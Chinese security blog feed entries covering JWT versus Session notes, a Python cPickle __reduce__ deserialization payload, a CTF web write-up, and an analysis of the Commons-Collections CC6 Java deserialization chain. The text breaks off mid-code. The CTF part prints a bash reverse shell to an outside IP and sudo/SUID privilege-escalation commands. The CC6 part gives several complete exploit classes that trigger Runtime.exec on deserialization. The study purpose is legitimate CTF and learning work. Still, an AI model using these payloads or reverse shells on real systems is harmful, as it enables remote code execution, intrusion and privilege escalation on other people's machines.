<h3 id="5-2-JWT与Session的差异"><a href="#5-2-JWT与Session的差异" class="headerlink" title="5.2. JWT与Session的差异"></a>5.2. JWT与Session的差异</h3><p>相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。</p>
<p>Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。</p>
<p>而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p>
<p>Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p>
<p><em><strong><img src="/2023/03/14/JWT/874963-20180707160150557-1205884800.png" class="" title="img"></strong></em></p>
<h3 id="5-3-基于Token的身份认证是如何工作的"><a href="#5-3-基于Token的身份认证是如何工作的" class="headerlink" title="5.3. 基于Token的身份认证是如何工作的"></a>5.3. 基于Token的身份认证是如何工作的</h3><p>基于Token的身份认证是无状态的，服务器或者Session中不会存储任何用户信息。</p>
<blockquote>
<p>没有会话信息意味着应用程序可以根据需要扩展和添加更多的机器，而不必担心用户登录的位置。</p>
</blockquote>
<p>虽然这一实现可能会有所不同，但其主要流程如下：</p>
<ol>
<li>用户携带用户名和密码请求访问</li>
<li>服务器校验用户凭据</li>
<li>应用提供一个token给客户端</li>
<li>客户端存储token，并且在随后的每一次请求中都带着它</li>
<li>服务器校验token并返回数据</li>
</ol>
<p>注意：</p>
<ol>
<li>每一次请求都需要token</li>
<li>Token应该放在请求header中</li>
<li>我们还需要将服务器设置为接受来自所有域的请求，用Access-Control-Allow-Origin: *</li>
</ol>
<h3 id="5-4-用Token的好处"><a href="#5-4-用Token的好处" class="headerlink" title="5.4. 用Token的好处"></a>5.4. 用Token的好处</h3><ul>
<li>无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。</li>
<li>安全：Token不是Cookie。（The token, not a cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!</li>
</ul>
<blockquote>
<img src="/2023/03/14/JWT/874963-20180707162551160-1143708148.png" class="" title="img">
</blockquote>
<p>还有一点，token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。</p>
<h3 id="5-5-JWT与OAuth的区别"><a href="#5-5-JWT与OAuth的区别" class="headerlink" title="5.5. JWT与OAuth的区别"></a>5.5. JWT与OAuth的区别</h3><ol>
<li>OAuth2是一种授权框架 ，JWT是一种认证协议</li>
<li>无论使用哪种方式切记用HTTPS来保证数据的安全性</li>
<li>OAuth2用在使用第三方账号登录的情况(比如使用weibo, qq, github登录某个app)，而<strong>JWT是用在前后端分离</strong>, 需要简单的对后台API进行保护时使用。</li>
</ol>
<h1 id="（Python）cPickle反序列化漏洞"><a href="#（Python）cPickle反序列化漏洞" class="headerlink" title="（Python）cPickle反序列化漏洞"></a>（Python）cPickle反序列化漏洞</h1><p>基本概念<br>Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。</p>
<p>cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数：</p>
<p>cPickle.dump()：将Python对象序列化保存到本地的文件中。</p>
<p>cPickle.load()：载入本地文件，将文件内容反序列化为Python对象。</p>
<p>cPickle.dumps()：将Python对象序列化为字符串。</p>
<p>cPickle.loads()：将字符串反序列化为Python对象。</p>
<p>简单示例：</p>
<p>先创建Person类对象并初始化，然后将其序列化并输出，可以看到是C解释过的内容：</p>
<img src="/2023/03/14/JWT/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NLSV8xMg==,size_16,color_FFFFFF,t_70.png" class="" title="img">

<p>为了方便，直接在该代码下面添加反序列化操作：</p>
<img src="/2023/03/14/JWT/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NLSV8xMg==,size_16,color_FFFFFF,t_70-16604488339323.png" class="" title="img">



<p>添加一个__reduce__()魔术方法：反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,username,password</span>):</span><br><span class="line">        self.username = username </span><br><span class="line">        self.password = password </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">	<span class="comment"># 未导入os模块，通用</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line">	<span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line">	<span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line">	<span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment"># 导入os模块</span></span><br><span class="line">    <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line">    <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line">    <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line">    <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line">    其他</span><br><span class="line">    <span class="comment"># return (commands.getoutput, (&#x27;cat /flag.txt&#x27;,))</span></span><br></pre></td></tr></table></figure>

<p>admin &#x3D; Person(‘admin’,’123456’)<br>result &#x3D; cPickle.dumps(admin)</p>
<p>user &#x3D; cPickle.loads(result)</p>
<h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><p>1、用更高级的接口__getnewargs()、<strong>getstate</strong>()、<strong>setstate</strong>()等代替__reduce__()魔术方法；</p>
<p>2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</p>
<p>&#x2F;change?name&#x3D;bmV3X3Jvb2tpZQ&#x3D;&#x3D;&amp;newname&#x3D;bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg&#x3D;&#x3D;</p>
<p>&#x2F;dacaiji?name&#x3D;new_rookie</p>
]]></content>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>HZNUCTF-web-2023</title>
    <url>/2023/04/02/HZNUCTF-web-2023/</url>
    <content><![CDATA[<p><strong>这次杭州师范的决赛题目质量还是很高的</strong></p>
<h1 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h1><p>打开网页</p>
<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111040161.png" class="" title="image-20230402111040161">

<p>获得信息 post传参开启burp</p>
<p>执行pwd有回显 但是其他命令都没有环境变量</p>
<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111143408.png" class="" title="image-20230402111143408">

<p>于是绝对路径执行命令</p>
<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111241491.png" class="" title="image-20230402111241491">

<p>但是cat flag时显示没有权限</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/39.105.192.9/9999 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>url编码后本地监听 nc -lvp 9999</p>
<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111114298.png" class="" title="image-20230402111114298">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null </span><br></pre></td></tr></table></figure>



<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402111453574.png" class="" title="image-20230402111453574">





<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find /home -<span class="built_in">exec</span> /bin/bash \;</span><br></pre></td></tr></table></figure>







<p>太菜了还是就写一题<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402121324673.png" class="" title="image-20230402121324673"></p>
<p>后俩题以后补充</p>
]]></content>
      <categories>
        <category>CTFWP</category>
      </categories>
  </entry>
  <entry>
    <title>CC6</title>
    <url>/2023/03/29/CC6/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> CC1 链的时候要求是比较严格的。要求的环境为<code>jdk8u65</code>与<code>Commons-Collections 3.2.1</code></p>
<p>而我们的 CC6 链，可以不受 jdk 版本制约。</p>
<h1 id="分析TiedMapEntry"><a href="#分析TiedMapEntry" class="headerlink" title="分析TiedMapEntry"></a>分析TiedMapEntry</h1><p>先看下TiedMapEntry中如何调用的get()</p>
<p>本类中有个toString()方法调用了getValue()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return getKey() + &quot;=&quot; + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而getValue()中调用了get()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再通过构造器将map赋为LazyMap即可回到CC1的后半部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有一个很关键的方法,直接调用getValue() </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">       Object value = getValue();</span><br><span class="line">       return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">              (value == null ? 0 : value.hashCode()); </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h1 id="hashMap"><a href="#hashMap" class="headerlink" title="hashMap"></a>hashMap</h1><p>方式二：是通过反射先从hashSet集合中获取map属性所指向的hashmap对象，然后再从hashmap中获取table属性中的Node对象，最后将Node对象中的key属性修改为TiedMapEntry对象，Node为啥能接收Entry？这明明是两个完全不同类型的对象，如果你对于HashMap底层实现非常了解的话，相信这一点对你来说应该不难理解，其实主要是因为Node实现了Entry接口。</p>
<img src="/2023/03/29/CC6/20210725103203148.png" class="" title="img">



<p>利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Gadget chain:</span><br><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line"> 	java.util.HashMap.readObject()</span><br><span class="line"> 		java.util.HashMap.hash()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line"> org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line"> java.lang.reflect.Method.invoke()</span><br><span class="line"> java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>readObject,s就是put方法进去的key,value</p>
<img src="/2023/03/29/CC6/image-20230402204324218.png" class="" title="image-20230402204324218">







<p>hashMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalCC6EXP</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line"> <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">         factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         factoryField.set(lazyMapClass, chainedTransformer);</span><br><span class="line"></span><br><span class="line">         serialize(expMap);</span><br><span class="line">         unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">                Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                        )</span><br><span class="line">                &#125;;</span><br><span class="line">                Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">                <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                expMap.put(tiedMapEntry,<span class="string">&quot;feng2&quot;</span>);</span><br><span class="line"></span><br><span class="line">                outerMap.remove(<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                field.set(chainedTransformer,transformers);</span><br><span class="line">                <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">                unserialize(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">                <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">                    <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">                        oin.readObject();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">                <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">                        oout.writeObject(o);</span><br><span class="line">                        <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="hashSet"><a href="#hashSet" class="headerlink" title="hashSet"></a>hashSet</h1><p>ysoserial</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>参考<a href="https://blog.csdn.net/qq_35733751/article/details/119077706">(118条消息) 11-java安全——java反序列化CC5和CC6链分析_cc6原理_songly_的博客-CSDN博客</a></p>
<p>利用链构造完了，接下来需要找到一个触发利用链的地方（重写了readObject方法同时又调用了put方法的地方），正好有一个HashSet集合满足条件，hashSet重写了writeObject和readObject方法实现自定义序列化与<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a></p>
<p>writeObject方法中会将hashSet集合中的元素依次取出来序列化，readObject方法会判断当前HashSet对象是否为LinkedHashSet，如果不是则直接返回HashMap，接着从流中读取hashSet集合中的元素并还原成java对象，然后将java对象作为参数key传给put方法，自定义序列化和反序列化过程中的hashSet集合中的元素是可控的，如果在hashSet集合中添加TiedMapEntry对象元素，这样就能控制put方法中的key了。</p>
<p>分析hashSet集合add方法底层实现后发现add方法底层调用了map.put方法，并且在putVal方法内部将key传给了Node。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">返回到putVal方法中，该方法会将Node对象（key/value键值对）赋给一个Node&lt;K,V&gt;[]类型的tab数组（tab实际上是由resize方法返回的table属性引用），即HashMap的table属性，因为hashSet集合添加元素底层用到了HashMap集合，而HashMap会把元素以Node进行存储。</span><br><span class="line"></span><br><span class="line">经过分析之后发现hashSet集合的add方法底层还是调用了map.put方法，控制put方法中的参数key的思路有两种：</span><br><span class="line"></span><br><span class="line">方式一：往hashSet集合中直接添加TiedMapEntry对象。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cc;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    方式一：往hashSet集合中直接添加TiedMapEntry对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span 